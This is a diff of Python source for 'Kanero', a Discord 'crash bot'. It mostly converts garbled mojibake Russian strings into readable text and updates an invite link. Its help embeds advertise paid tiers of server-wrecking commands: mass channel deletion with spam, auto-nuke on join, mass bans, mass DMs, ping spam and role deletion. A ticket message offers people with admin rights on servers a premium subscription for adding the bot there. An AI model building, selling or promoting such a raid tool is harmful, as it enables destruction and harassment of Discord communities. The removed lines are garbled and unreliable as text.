-                            "вЂў `!help` вЂ” СЃРїРёСЃРѕРє РІСЃРµС… РєРѕРјР°РЅРґ\n"
-                            "вЂў `!changelog` вЂ” РїРѕСЃР»РµРґРЅРёРµ РѕР±РЅРѕРІР»РµРЅРёСЏ\n\n"
-                            "**вњ… White (РїР»Р°С‚РЅС‹Р№ РґРѕСЃС‚СѓРї):**\n"
-                            "Р’СЃРµ РєРѕРјР°РЅРґС‹ Freelist + РґРѕРїРѕР»РЅРёС‚РµР»СЊРЅРѕ:\n"
-                            "вЂў `!nuke [С‚РµРєСЃС‚]` вЂ” РєСЂР°С€ СЃ С‚РІРѕРёРј С‚РµРєСЃС‚РѕРј СЃРїР°РјР°\n"
-                            "вЂў `!stop` вЂ” РѕСЃС‚Р°РЅРѕРІРёС‚СЊ РєСЂР°С€\n"
-                            "вЂў `!cleanup` вЂ” СѓРґР°Р»РёС‚СЊ РІСЃРµ РєР°РЅР°Р»С‹\n"
-                            "вЂў `!rename [РЅР°Р·РІР°РЅРёРµ]` вЂ” РїРµСЂРµРёРјРµРЅРѕРІР°С‚СЊ СЃРµСЂРІРµСЂ\n"
-                            "вЂў `!nicks_all [РЅРёРє]` вЂ” СЃРјРµРЅРёС‚СЊ РІСЃРµРј РЅРёРєРё\n"
-                            "вЂў `!webhooks` вЂ” СЃРѕР·РґР°С‚СЊ 50 РІРµР±С…СѓРєРѕРІ\n"
-                            "вЂў `!clear [С‡РёСЃР»Рѕ]` вЂ” СѓРґР°Р»РёС‚СЊ СЃРѕРѕР±С‰РµРЅРёСЏ\n"
-                            "вЂў `!clear_all` вЂ” СѓРґР°Р»РёС‚СЊ Р’РЎР• СЃРѕРѕР±С‰РµРЅРёСЏ РІ РєР°РЅР°Р»Рµ\n\n"
-                            "**рџ’Ћ Premium (РјР°РєСЃРёРјР°Р»СЊРЅС‹Р№ РґРѕСЃС‚СѓРї):**\n"
-                            "Р’СЃРµ РєРѕРјР°РЅРґС‹ White + РјРѕС‰РЅС‹Рµ С„СѓРЅРєС†РёРё:\n"
-                            "вЂў `!super_nuke` вЂ” СѓСЃРёР»РµРЅРЅС‹Р№ РєСЂР°С€ (Р±Р°РЅРёС‚ РІСЃРµС… + СѓРґР°Р»СЏРµС‚ СЂРѕР»Рё)\n"
-                            "вЂў `!auto_super_nuke on/off` вЂ” Р°РІС‚РѕРјР°С‚РёС‡РµСЃРєРёР№ СЃСѓРїРµСЂ-РєСЂР°С€\n"
-                            "вЂў `!massban` вЂ” РјР°СЃСЃРѕРІС‹Р№ Р±Р°РЅ СѓС‡Р°СЃС‚РЅРёРєРѕРІ\n"
-                            "вЂў `!massdm [С‚РµРєСЃС‚]` вЂ” РѕС‚РїСЂР°РІРёС‚СЊ Р›РЎ РІСЃРµРј\n"
-                            "вЂў `!spam [С‚РµРєСЃС‚] [С‡РёСЃР»Рѕ]` вЂ” СЃРїР°Рј РІ РєР°РЅР°Р»Рµ\n"
-                            "вЂў `!pingspam [@СЂРѕР»СЊ] [С‡РёСЃР»Рѕ]` вЂ” СЃРїР°Рј СѓРїРѕРјРёРЅР°РЅРёСЏРјРё\n"
-                            "вЂў `!rolesdelete` вЂ” СѓРґР°Р»РёС‚СЊ РІСЃРµ СЂРѕР»Рё\n\n"
-                            "**рџ’° РљСѓРїРёС‚СЊ White / Premium:**\n"
-                            "РџРµСЂРµР№РґРё РЅР° FunPay Рё РІС‹Р±РµСЂРё С‚Р°СЂРёС„:\n"
+                            "**?? Как добавить бота на свой сервер:**\n"
+                            "1. Получи доступ (см. ниже)\n"
+                            "2. Напиши `!inv` боту в ЛС или на сервере\n"
+                            "3. Перейди по ссылке и выбери свой сервер\n"
+                            "4. **ВАЖНО:** Дай боту роль с правами **Администратора**\n"
+                            "5. Подними роль бота **выше всех** в настройках сервера\n"
+                            "6. Готово! Используй команды\n\n"
+                            "**?? Бесплатный доступ (Freelist):**\n"
+                            f"Напиши любое сообщение в {addbot_ch.mention if addbot_ch else '???addbot'}\n"
+                            "Получишь роль ?? User и команды:\n"
+                            "• `!nuke` — удаляет все каналы и создает 30 новых со спамом\n"
+                            "• `!auto_nuke on/off` — автоматический краш при добавлении бота\n"
+                            "• `!help` — список всех команд\n"
+                            "• `!changelog` — последние обновления\n\n"
+                            "**? White (платный доступ):**\n"
+                            "Все команды Freelist + дополнительно:\n"
+                            "• `!nuke [текст]` — краш с твоим текстом спама\n"
+                            "• `!stop` — остановить краш\n"
+                            "• `!cleanup` — удалить все каналы\n"
+                            "• `!rename [название]` — переименовать сервер\n"
+                            "• `!nicks_all [ник]` — сменить всем ники\n"
+                            "• `!webhooks` — создать 50 вебхуков\n"
+                            "• `!clear [число]` — удалить сообщения\n"
+                            "• `!clear_all` — удалить ВСЕ сообщения в канале\n\n"
+                            "**?? Premium (максимальный доступ):**\n"
+                            "Все команды White + мощные функции:\n"
+                            "• `!super_nuke` — усиленный краш (банит всех + удаляет роли)\n"
+                            "• `!auto_super_nuke on/off` — автоматический супер-краш\n"
+                            "• `!massban` — массовый бан участников\n"
+                            "• `!massdm [текст]` — отправить ЛС всем\n"
+                            "• `!spam [текст] [число]` — спам в канале\n"
+                            "• `!pingspam [@роль] [число]` — спам упоминаниями\n"
+                            "• `!rolesdelete` — удалить все роли\n\n"
+                            "**?? Купить White / Premium:**\n"
+                            "Перейди на FunPay и выбери тариф:\n"
                             "https://funpay.com/users/16928925/ \n\n"
-                            "**вќ“ РќСѓР¶РЅР° РїРѕРјРѕС‰СЊ?**\n"
-                            f"РЎРѕР·РґР°Р№ С‚РёРєРµС‚: {ticket_ch.mention if ticket_ch else 'рџЋ«гѓ»create-ticket'}\n"
-                            "РђРґРјРёРЅРёСЃС‚СЂР°С†РёСЏ РѕС‚РІРµС‚РёС‚ РІ С‚РµС‡РµРЅРёРµ 24 С‡Р°СЃРѕРІ\n\n"
-                            "**рџ”— РќР°С€ Discord СЃРµСЂРІРµСЂ:**\n"
-                            "https://discord.gg/aud6wwYVRd \n"
-                            "Р—Р°С…РѕРґРё Рє РЅР°Рј РІ РіРѕСЃС‚Рё!"
+                            "**? Нужна помощь?**\n"
+                            f"Создай тикет: {ticket_ch.mention if ticket_ch else '???create-ticket'}\n"
+                            "Администрация ответит в течение 24 часов\n\n"
+                            "**?? Наш Discord сервер:**\n"
+                            "https://discord.gg/nNTB37QNCG \n"
+                            "Заходи к нам в гости!"
                         ),
                         color=0x0a0a0a
                     )
-                    info_embed.set_footer(text="в пёЏ Kanero  |  РљСЂР°С€-Р±РѕС‚ РґР»СЏ Discord")
+                    info_embed.set_footer(text="?? Kanero  |  Краш-бот для Discord")
                     
                     if existing_message:
-                        # РћР±РЅРѕРІР»СЏРµРј СЃСѓС‰РµСЃС‚РІСѓСЋС‰РµРµ СЃРѕРѕР±С‰РµРЅРёРµ
+                        # Обновляем существующее сообщение
                         await existing_message.edit(embed=info_embed)
-                        results.append("вњ… РћР±РЅРѕРІР»РµРЅС‹ СЃСЃС‹Р»РєРё РІ в„№пёЏгѓ»info")
+                        results.append("? Обновлены ссылки в ???info")
                     else:
-                        # РћС‚РїСЂР°РІР»СЏРµРј РЅРѕРІРѕРµ СЃРѕРѕР±С‰РµРЅРёРµ РµСЃР»Рё СЃС‚Р°СЂРѕРіРѕ РЅРµС‚
+                        # Отправляем новое сообщение если старого нет
                         await info_ch.send(embed=info_embed)
-                        results.append("вњ… Р”РѕР±Р°РІР»РµРЅРѕ СЃРѕРѕР±С‰РµРЅРёРµ РІ в„№пёЏгѓ»info")
+                        results.append("? Добавлено сообщение в ???info")
                 except Exception as e:
-                    results.append(f"вќЊ РћР±РЅРѕРІР»РµРЅРёРµ в„№пёЏгѓ»info: {e}")
+                    results.append(f"? Обновление ???info: {e}")
         if not any("changelog" in n for n in existing_info):
             try:
                 ow_changelog = {guild.default_role: _ow()}
@@ -3159,79 +3159,79 @@ async def setup_update(ctx):
                 if role_prem:  ow_changelog[role_prem]  = _ow(True, False)
                 if role_owner: ow_changelog[role_owner] = _ow(True, True)
                 if role_dev:   ow_changelog[role_dev]   = _ow(True, True)
-                await guild.create_text_channel("рџ“‹гѓ»changelog", category=cat_info, overwrites=ow_changelog, topic="РСЃС‚РѕСЂРёСЏ РѕР±РЅРѕРІР»РµРЅРёР№ вЂ” !changelogall")
-                results.append("вњ… РЎРѕР·РґР°РЅ рџ“‹гѓ»changelog")
+                await guild.create_text_channel("???changelog", category=cat_info, overwrites=ow_changelog, topic="История обновлений — !changelogall")
+                results.append("? Создан ???changelog")
             except Exception as e:
-                results.append(f"вќЊ рџ“‹гѓ»changelog: {e}")
+                results.append(f"? ???changelog: {e}")
 
-    # 7. РџСЂРѕРІРµСЂСЏРµРј Рё РѕР±РЅРѕРІР»СЏРµРј СЃРѕРѕР±С‰РµРЅРёРµ РІ create-ticket РµСЃР»Рё РЅСѓР¶РЅРѕ
-    ticket_ch = discord.utils.find(lambda c: "create-ticket" in c.name.lower() or "С‚РёРєРµС‚" in c.name.lower(), guild.text_channels)
+    # 7. Проверяем и обновляем сообщение в create-ticket если нужно
+    ticket_ch = discord.utils.find(lambda c: "create-ticket" in c.name.lower() or "тикет" in c.name.lower(), guild.text_channels)
     if ticket_ch:
         try:
-            results.append(f"рџ”Ќ РќР°Р№РґРµРЅ РєР°РЅР°Р»: {ticket_ch.name}")
+            results.append(f"?? Найден канал: {ticket_ch.name}")
             
-            # РС‰РµРј СЃСѓС‰РµСЃС‚РІСѓСЋС‰РµРµ СЃРѕРѕР±С‰РµРЅРёРµ Р±РѕС‚Р° СЃ embed "РџРѕРґРґРµСЂР¶РєР° вЂ” Kanero"
+            # Ищем существующее сообщение бота с embed "Поддержка — Kanero"
             existing_message = None
             message_count = 0
             async for message in ticket_ch.history(limit=50):
                 message_count += 1
                 if (message.author == bot.user and message.embeds and 
                     len(message.embeds) > 0 and 
-                    "РџРѕРґРґРµСЂР¶РєР° вЂ” Kanero" in message.embeds[0].title):
+                    "Поддержка — Kanero" in message.embeds[0].title):
                     existing_message = message
                     break
             
-            results.append(f"рџ”Ќ РџСЂРѕРІРµСЂРµРЅРѕ СЃРѕРѕР±С‰РµРЅРёР№: {message_count}")
+            results.append(f"?? Проверено сообщений: {message_count}")
             
-            # РЎРѕР·РґР°РµРј РѕР±РЅРѕРІР»РµРЅРЅС‹Р№ embed
+            # Создаем обновленный embed
             ticket_embed = discord.Embed(
-                title="рџЋ« РџРѕРґРґРµСЂР¶РєР° вЂ” Kanero",
+                title="?? Поддержка — Kanero",
                 description=(
-                    "РќСѓР¶РЅР° РїРѕРјРѕС‰СЊ? Р•СЃС‚СЊ РІРѕРїСЂРѕСЃ?\n\n"
-                    "РќР°Р¶РјРё РєРЅРѕРїРєСѓ РЅРёР¶Рµ вЂ” Р±РѕС‚ СЃРѕР·РґР°СЃС‚ РїСЂРёРІР°С‚РЅС‹Р№ РєР°РЅР°Р» С‚РѕР»СЊРєРѕ РґР»СЏ С‚РµР±СЏ Рё РєРѕРјР°РЅРґС‹ РїРѕРґРґРµСЂР¶РєРё.\n\n"
-                    "вЂў Р’РѕРїСЂРѕСЃС‹ РїРѕ Р±РѕС‚Сѓ\n"
-                    "вЂў РџРѕРєСѓРїРєР° White / Premium\n"
-                    "вЂў Р–Р°Р»РѕР±С‹ Рё РїСЂРµРґР»РѕР¶РµРЅРёСЏ\n\n"
-                    "**рџ‘Ґ РљРѕРјР°РЅРґР° РїРѕРґРґРµСЂР¶РєРё:**\n"
-                    "рџ‘‘ Owner вЂў рџ”§ Developer вЂў рџ›ЎпёЏ Moderator\n\n"
-                    "**рџ’Ў Р•СЃС‚СЊ Discord СЃРµСЂРІРµСЂ СЃ СѓС‡Р°СЃС‚РЅРёРєР°РјРё?**\n"
-                    "Р•СЃР»Рё Сѓ С‚РµР±СЏ РµСЃС‚СЊ **Р°РґРјРёРЅ РїСЂР°РІР°** РЅР° РєР°РєРѕРј-Р»РёР±Рѕ Discord СЃРµСЂРІРµСЂРµ СЃ СѓС‡Р°СЃС‚РЅРёРєР°РјРё (С…РѕС‚СЊ СЃРєРѕР»СЊРєРѕ), СЃРѕР·РґР°РІР°Р№ С‚РёРєРµС‚!\n"
-                    "Р”РѕР±Р°РІР»СЏРµС€СЊ РЅР°С€РµРіРѕ Р±РѕС‚Р° С‚СѓРґР° вЂ” РїРѕР»СѓС‡Р°РµС€СЊ **Р»СѓС‡С€СѓСЋ РїРѕРґРїРёСЃРєСѓ** РІ РѕР±РјРµРЅ рџЋЃ"
+                    "Нужна помощь? Есть вопрос?\n\n"
+                    "Нажми кнопку ниже — бот создаст приватный канал только для тебя и команды поддержки.\n\n"
+                    "• Вопросы по боту\n"
+                    "• Покупка White / Premium\n"
+                    "• Жалобы и предложения\n\n"
+                    "**?? Команда поддержки:**\n"
+                    "?? Owner • ?? Developer • ??? Moderator\n\n"
+                    "**?? Есть Discord сервер с участниками?**\n"
+                    "Если у тебя есть **админ права** на каком-либо Discord сервере с участниками (хоть сколько), создавай тикет!\n"
+                    "Добавляешь нашего бота туда — получаешь **лучшую подписку** в обмен ??"
                 ),
                 color=0x0a0a0a
             )
-            ticket_embed.set_footer(text="в пёЏ Kanero  |  РћРґРёРЅ С‚РёРєРµС‚ РЅР° РїРѕР»СЊР·РѕРІР°С‚РµР»СЏ")
+            ticket_embed.set_footer(text="?? Kanero  |  Один тикет на пользователя")
             
             if existing_message:
-                # РћР±РЅРѕРІР»СЏРµРј СЃСѓС‰РµСЃС‚РІСѓСЋС‰РµРµ СЃРѕРѕР±С‰РµРЅРёРµ
+                # Обновляем существующее сообщение
                 await existing_message.edit(embed=ticket_embed, view=TicketOpenView())
-                results.append("вњ… РћР±РЅРѕРІР»РµРЅРѕ СЃРѕРѕР±С‰РµРЅРёРµ РІ create-ticket")
+                results.append("? Обновлено сообщение в create-ticket")
             else:
-                # РћС‚РїСЂР°РІР»СЏРµРј РЅРѕРІРѕРµ СЃРѕРѕР±С‰РµРЅРёРµ РµСЃР»Рё СЃС‚Р°СЂРѕРіРѕ РЅРµС‚
+                # Отправляем новое сообщение если старого нет
                 await ticket_ch.send(embed=ticket_embed, view=TicketOpenView())
-                results.append("вњ… Р”РѕР±Р°РІР»РµРЅРѕ СЃРѕРѕР±С‰РµРЅРёРµ РІ create-ticket")
+                results.append("? Добавлено сообщение в create-ticket")
         except Exception as e:
-            results.append(f"вќЊ РћР±РЅРѕРІР»РµРЅРёРµ create-ticket: {str(e)}")
+            results.append(f"? Обновление create-ticket: {str(e)}")
     else:
-        results.append("вљ пёЏ РљР°РЅР°Р» create-ticket РЅРµ РЅР°Р№РґРµРЅ")
+        results.append("?? Канал create-ticket не найден")
 
-    # 8. РћР±РЅРѕРІР»СЏРµРј РїРѕР·РёС†РёРё РєР°С‚РµРіРѕСЂРёР№ (Р§РђРўР« РґРѕР»Р¶РЅР° Р±С‹С‚СЊ РЅР°Рґ ADMIN)
+    # 8. Обновляем позиции категорий (ЧАТЫ должна быть над ADMIN)
     try:
-        cat_chat = discord.utils.find(lambda c: "Р§РђРўР«" in c.name, guild.categories)
+        cat_chat = discord.utils.find(lambda c: "ЧАТЫ" in c.name, guild.categories)
         cat_admin = discord.utils.find(lambda c: "ADMIN" in c.name, guild.categories)
         
         if cat_chat and cat_admin and cat_chat.position > cat_admin.position:
-            # Р§РђРўР« РЅР°С…РѕРґРёС‚СЃСЏ РЅРёР¶Рµ ADMIN, РЅСѓР¶РЅРѕ РїРµСЂРµРјРµСЃС‚РёС‚СЊ РІС‹С€Рµ
+            # ЧАТЫ находится ниже ADMIN, нужно переместить выше
             await cat_chat.edit(position=cat_admin.position)
-            results.append("вњ… РџРµСЂРµРјРµС‰РµРЅР° РєР°С‚РµРіРѕСЂРёСЏ Р§РђРўР« РЅР°Рґ ADMIN")
+            results.append("? Перемещена категория ЧАТЫ над ADMIN")
     except Exception as e:
-        results.append(f"вќЊ РџРµСЂРµРјРµС‰РµРЅРёРµ РєР°С‚РµРіРѕСЂРёР№: {e}")
+        results.append(f"? Перемещение категорий: {e}")
 
-    # 8.5. РЎРѕР·РґР°С‘Рј РєР°С‚РµРіРѕСЂРёСЋ TESTS РµСЃР»Рё РµС‘ РЅРµС‚
-    cat_tests = discord.utils.find(lambda c: "TESTS" in c.name or "РўР•РЎРўР«" in c.name or "С‚РµСЃС‚С‹" in c.name.lower(), guild.categories)
+    # 8.5. Создаём категорию TESTS если её нет
+    cat_tests = discord.utils.find(lambda c: "TESTS" in c.name or "ТЕСТЫ" in c.name or "тесты" in c.name.lower(), guild.categories)
     if not cat_tests:
         try:
-            role_tester = discord.utils.find(lambda r: r.name == "рџ§Є Tester", guild.roles)
+            role_tester = discord.utils.find(lambda r: r.name == "?? Tester", guild.roles)
             ow_tests = {guild.default_role: _ow()}
             if role_guest: ow_tests[role_guest] = _ow()
             if role_user:  ow_tests[role_user]  = _ow()
@@ -3241,20 +3241,20 @@ async def setup_update(ctx):
             if role_owner: ow_tests[role_owner] = _ow(True, True)
             if role_dev:   ow_tests[role_dev]   = _ow(True, True)
             
-            cat_tests = await guild.create_category("в”Ѓв”Ѓв”Ѓв”Ѓ рџ§Є TESTS в”Ѓв”Ѓв”Ѓв”Ѓ", overwrites=ow_tests)
+            cat_tests = await guild.create_category("???? ?? TESTS ????", overwrites=ow_tests)
             
-            # РЎРѕР·РґР°С‘Рј РєР°РЅР°Р»С‹ РІ TESTS
-            await guild.create_text_channel("рџђ›гѓ»bug-reports", category=cat_tests, overwrites=ow_tests, topic="РћС‚С‡С‘С‚С‹ РѕР± РѕС€РёР±РєР°С… Рё Р±Р°РіР°С… вЂ” РїРёС€СѓС‚ Tester")
-            await guild.create_text_channel("рџ§Єгѓ»testing", category=cat_tests, overwrites=ow_tests, topic="РўРµСЃС‚РёСЂРѕРІР°РЅРёРµ РЅРѕРІС‹С… С„СѓРЅРєС†РёР№ вЂ” РѕР±СЃСѓР¶РґРµРЅРёРµ Рё СЂРµР·СѓР»СЊС‚Р°С‚С‹")
-            await guild.create_text_channel("вњ…гѓ»test-results", category=cat_tests, overwrites=ow_tests, topic="Р РµР·СѓР»СЊС‚Р°С‚С‹ С‚РµСЃС‚РёСЂРѕРІР°РЅРёСЏ Рё СЃС‚Р°С‚СѓСЃ РёСЃРїСЂР°РІР»РµРЅРёР№")
+            # Создаём каналы в TESTS
+            await guild.create_text_channel("???bug-reports", category=cat_tests, overwrites=ow_tests, topic="Отчёты об ошибках и багах — пишут Tester")
+            await guild.create_text_channel("???testing", category=cat_tests, overwrites=ow_tests, topic="Тестирование новых функций — обсуждение и результаты")
+            await guild.create_text_channel("??test-results", category=cat_tests, overwrites=ow_tests, topic="Результаты тестирования и статус исправлений")
             
-            results.append("вњ… РЎРѕР·РґР°РЅР° РєР°С‚РµРіРѕСЂРёСЏ рџ§Є TESTS СЃ РєР°РЅР°Р»Р°РјРё")
+            results.append("? Создана категория ?? TESTS с каналами")
         except Exception as e:
-            results.append(f"вќЊ РљР°С‚РµРіРѕСЂРёСЏ TESTS: {e}")
+            results.append(f"? Категория TESTS: {e}")
     else:
-        # РџСЂРѕРІРµСЂСЏРµРј РЅР°Р»РёС‡РёРµ РєР°РЅР°Р»РѕРІ РІ TESTS
+        # Проверяем наличие каналов в TESTS
         existing_tests = [ch.name.lower() for ch in cat_tests.channels]
-        role_tester = discord.utils.find(lambda r: r.name == "рџ§Є Tester", guild.roles)
+        role_tester = discord.utils.find(lambda r: r.name == "?? Tester", guild.roles)
         ow_tests = {guild.default_role: _ow()}
         if role_guest: ow_tests[role_guest] = _ow()
         if role_user:  ow_tests[role_user]  = _ow()
@@ -3266,41 +3266,41 @@ async def setup_update(ctx):
         
         if not any("bug" in n for n in existing_tests):
             try:
-                await guild.create_text_channel("рџђ›гѓ»bug-reports", category=cat_tests, overwrites=ow_tests, topic="РћС‚С‡С‘С‚С‹ РѕР± РѕС€РёР±РєР°С… Рё Р±Р°РіР°С… вЂ” РїРёС€СѓС‚ Tester")
-                results.append("вњ… РЎРѕР·РґР°РЅ рџђ›гѓ»bug-reports")
+                await guild.create_text_channel("???bug-reports", category=cat_tests, overwrites=ow_tests, topic="Отчёты об ошибках и багах — пишут Tester")
+                results.append("? Создан ???bug-reports")
             except Exception as e:
-                results.append(f"вќЊ рџђ›гѓ»bug-reports: {e}")
+                results.append(f"? ???bug-reports: {e}")
         if not any("testing" in n for n in existing_tests):
             try:
-                await guild.create_text_channel("рџ§Єгѓ»testing", category=cat_tests, overwrites=ow_tests, topic="РўРµСЃС‚РёСЂРѕРІР°РЅРёРµ РЅРѕРІС‹С… С„СѓРЅРєС†РёР№ вЂ” РѕР±СЃСѓР¶РґРµРЅРёРµ Рё СЂРµР·СѓР»СЊС‚Р°С‚С‹")
-                results.append("вњ… РЎРѕР·РґР°РЅ рџ§Єгѓ»testing")
+                await guild.create_text_channel("???testing", category=cat_tests, overwrites=ow_tests, topic="Тестирование новых функций — обсуждение и результаты")
+                results.append("? Создан ???testing")
             except Exception as e:
-                results.append(f"вќЊ рџ§Єгѓ»testing: {e}")
-        if not any("test-results" in n or "СЂРµР·СѓР»СЊС‚Р°С‚" in n for n in existing_tests):
+                results.append(f"? ???testing: {e}")
+        if not any("test-results" in n or "результат" in n for n in existing_tests):
             try:
-                await guild.create_text_channel("вњ…гѓ»test-results", category=cat_tests, overwrites=ow_tests, topic="Р РµР·СѓР»СЊС‚Р°С‚С‹ С‚РµСЃС‚РёСЂРѕРІР°РЅРёСЏ Рё СЃС‚Р°С‚СѓСЃ РёСЃРїСЂР°РІР»РµРЅРёР№")
-                results.append("вњ… РЎРѕР·РґР°РЅ вњ…гѓ»test-results")
+                await guild.create_text_channel("??test-results", category=cat_tests, overwrites=ow_tests, topic="Результаты тестирования и статус исправлений")
+                results.append("? Создан ??test-results")
             except Exception as e:
-                results.append(f"вќЊ вњ…гѓ»test-results: {e}")
+                results.append(f"? ??test-results: {e}")
 
-    # 9. РћР±РЅРѕРІР»СЏРµРј РїРѕР·РёС†РёРё СЂРѕР»РµР№
+    # 9. Обновляем позиции ролей
     try:
         bot_top = ctx.guild.me.top_role.position
         if bot_top < 10:
-            results.append(f"вљ пёЏ Р РѕР»СЊ Р±РѕС‚Р° СЃР»РёС€РєРѕРј РЅРёР·РєРѕ (РїРѕР·РёС†РёСЏ {bot_top}) вЂ” РїРѕРґРЅРёРјРё СЂРѕР»СЊ **рџ¤– Kanero** РІСЂСѓС‡РЅСѓСЋ РІС‹С€Рµ РІСЃРµС…, Р·Р°С‚РµРј РїРѕРІС‚РѕСЂРё `!setup_update`")
+            results.append(f"?? Роль бота слишком низко (позиция {bot_top}) — подними роль **?? Kanero** вручную выше всех, затем повтори `!setup_update`")
         else:
             order = [
-                ("рџ¤– Kanero",     bot_top - 1),
-                ("рџ”§ Developer",  bot_top - 2),
-                ("рџ‘‘ Owner",      bot_top - 3),
-                ("рџ§Є Tester",     bot_top - 4),
-                ("рџ›ЎпёЏ Moderator",  bot_top - 5),
-                ("рџ¤ќ Friend",     bot_top - 6),
-                ("рџ’Ћ Premium",    bot_top - 7),
-                ("вњ… White",      bot_top - 8),
-                ("рџЋ¬ Media",      bot_top - 9),
-                ("рџ‘Ґ User",       bot_top - 10),
-                ("рџ‘¤ Guest",      1),
+                ("?? Kanero",     bot_top - 1),
+                ("?? Developer",  bot_top - 2),
+                ("?? Owner",      bot_top - 3),
+                ("?? Tester",     bot_top - 4),
+                ("??? Moderator",  bot_top - 5),
+                ("?? Friend",     bot_top - 6),
+                ("?? Premium",    bot_top - 7),
+                ("? White",      bot_top - 8),
+                ("?? Media",      bot_top - 9),
+                ("?? User",       bot_top - 10),
+                ("?? Guest",      1),
             ]
             for rname, pos in order:
                 r = discord.utils.find(lambda x, n=rname: x.name == n, guild.roles)
@@ -3309,52 +3309,52 @@ async def setup_update(ctx):
                         await r.edit(position=max(1, pos))
                     except Exception:
                         pass
-            results.append("вњ… РџРѕР·РёС†РёРё СЂРѕР»РµР№ РѕР±РЅРѕРІР»РµРЅС‹")
+            results.append("? Позиции ролей обновлены")
     except Exception as e:
-        results.append(f"вќЊ РџРѕР·РёС†РёРё СЂРѕР»РµР№: {e}")
+        results.append(f"? Позиции ролей: {e}")
 
     embed = discord.Embed(
-        title="рџ”„ РЎРµСЂРІРµСЂ РѕР±РЅРѕРІР»С‘РЅ",
+        title="?? Сервер обновлён",
         description="\n".join(results),
         color=0x0a0a0a
     )
-    embed.set_footer(text="в пёЏ Kanero  |  РљР°РЅР°Р»С‹ РЅРµ СѓРґР°Р»СЏР»РёСЃСЊ  |  !setup вЂ” РїРѕР»РЅС‹Р№ РїРµСЂРµСЃРѕР·РґР°С‚СЊ")
+    embed.set_footer(text="?? Kanero  |  Каналы не удалялись  |  !setup — полный пересоздать")
     await msg.edit(content=None, embed=embed)
 
-    # в”Ђв”Ђ РћР±РЅРѕРІР»СЏРµРј СЃСЃС‹Р»РєСѓ РІ С‚РµРєСЃС‚Рµ РЅСЋРєР° в”Ђв”Ђ
-    invite = "https://discord.gg/aud6wwYVRd"
+    # -- Обновляем ссылку в тексте нюка --
+    invite = "https://discord.gg/nNTB37QNCG"
     import re as _re
     old_text = config.SPAM_TEXT
-    # Р—Р°РјРµРЅСЏРµРј Р»СЋР±СѓСЋ discord.gg/... СЃСЃС‹Р»РєСѓ РЅР° Р°РєС‚СѓР°Р»СЊРЅСѓСЋ
+    # Заменяем любую discord.gg/... ссылку на актуальную
     new_text = _re.sub(r'https://discord\.gg/\S+', invite, old_text)
     if new_text != old_text:
         config.SPAM_TEXT = new_text
         save_spam_text()
-        results.append("вњ… РЎСЃС‹Р»РєР° РІ С‚РµРєСЃС‚Рµ РЅСЋРєР° РѕР±РЅРѕРІР»РµРЅР°")
+        results.append("? Ссылка в тексте нюка обновлена")
 
-    # в”Ђв”Ђ РџРѕСЃС‚РёРј РІ РЅРѕРІРѕСЃС‚Рё Рё sell в”Ђв”Ђ
+    # -- Постим в новости и sell --
     await _post_news_and_sell(guild)
 
 
 @bot.command(name="autorole")
 @wl_check()
 async def autorole_cmd(ctx):
-    """РџРѕРєР°Р·С‹РІР°РµС‚ СЃС‚Р°С‚СѓСЃ Р°РІС‚Рѕ-СЂРѕР»Рё РїСЂРё РІС…РѕРґРµ РЅР° СЃРµСЂРІРµСЂ."""
+    """Показывает статус авто-роли при входе на сервер."""
     guild = ctx.guild
-    guest_role = discord.utils.find(lambda r: r.name == "рџ‘¤ Guest", guild.roles)
+    guest_role = discord.utils.find(lambda r: r.name == "?? Guest", guild.roles)
 
     lines = []
     if guest_role:
-        lines.append(f"вњ… РђРІС‚Рѕ-СЂРѕР»СЊ Р°РєС‚РёРІРЅР°: {guest_role.mention} (`{guest_role.id}`)")
+        lines.append(f"? Авто-роль активна: {guest_role.mention} (`{guest_role.id}`)")
     else:
-        lines.append("вќЊ Р РѕР»СЊ **рџ‘¤ Guest** РЅРµ РЅР°Р№РґРµРЅР° вЂ” Р·Р°РїСѓСЃС‚Рё `!setup` РёР»Рё СЃРѕР·РґР°Р№ СЂРѕР»СЊ РІСЂСѓС‡РЅСѓСЋ")
+        lines.append("? Роль **?? Guest** не найдена — запусти `!setup` или создай роль вручную")
 
     embed = discord.Embed(
-        title="рџ”§ РЎС‚Р°С‚СѓСЃ Р°РІС‚Рѕ-СЂРѕР»Рё",
+        title="?? Статус авто-роли",
         description="\n".join(lines),
         color=0x0a0a0a
     )
-    embed.set_footer(text="Р РѕР»СЊ РІС‹РґР°С‘С‚СЃСЏ Р°РІС‚РѕРјР°С‚РёС‡РµСЃРєРё РїСЂРё РІС…РѕРґРµ РЅР° СЃРµСЂРІРµСЂ")
+    embed.set_footer(text="Роль выдаётся автоматически при входе на сервер")
     await ctx.send(embed=embed)
 
 
@@ -3365,7 +3365,7 @@ async def on_add(ctx, user_id: int):
     if user_id not in OWNER_NUKE_LIST:
         OWNER_NUKE_LIST.append(user_id)
         save_owner_nuke_list()
-    await ctx.send(f"рџ‘‘ `{user_id}` РїРѕР»СѓС‡РёР» РґРѕСЃС‚СѓРї Рє **Owner Nuke**.")
+    await ctx.send(f"?? `{user_id}` получил доступ к **Owner Nuke**.")
 
 
 @bot.command(name="on_remove")
@@ -3375,9 +3375,9 @@ async def on_remove(ctx, user_id: int):
     if user_id in OWNER_NUKE_LIST:
         OWNER_NUKE_LIST.remove(user_id)
         save_owner_nuke_list()
-        await ctx.send(f"вњ… `{user_id}` СѓР±СЂР°РЅ РёР· Owner Nuke.")
+        await ctx.send(f"? `{user_id}` убран из Owner Nuke.")
     else:
-        await ctx.send("РќРµ РЅР°Р№РґРµРЅ.")
+        await ctx.send("Не найден.")
 
 
 @bot.command(name="on_list")
@@ -3388,20 +3388,20 @@ async def on_list(ctx):
     for uid in OWNER_NUKE_LIST:
         try:
             user = await bot.fetch_user(uid)
-            lines.append(f"`{uid}` вЂ” **{user}**")
+            lines.append(f"`{uid}` — **{user}**")
         except Exception:
-            lines.append(f"`{uid}` вЂ” *РЅРµ РЅР°Р№РґРµРЅ*")
-    embed = discord.Embed(title="рџ‘‘ Owner Nuke List", description="\n".join(lines) if lines else "*РїСѓСЃС‚Рѕ*", color=0x0a0a0a)
-    embed.set_footer(text=f"в пёЏ Kanero  |  Р’СЃРµРіРѕ: {len(OWNER_NUKE_LIST)}")
+            lines.append(f"`{uid}` — *не найден*")
+    embed = discord.Embed(title="?? Owner Nuke List", description="\n".join(lines) if lines else "*пусто*", color=0x0a0a0a)
+    embed.set_footer(text=f"?? Kanero  |  Всего: {len(OWNER_NUKE_LIST)}")
     await ctx.send(embed=embed)
 
 
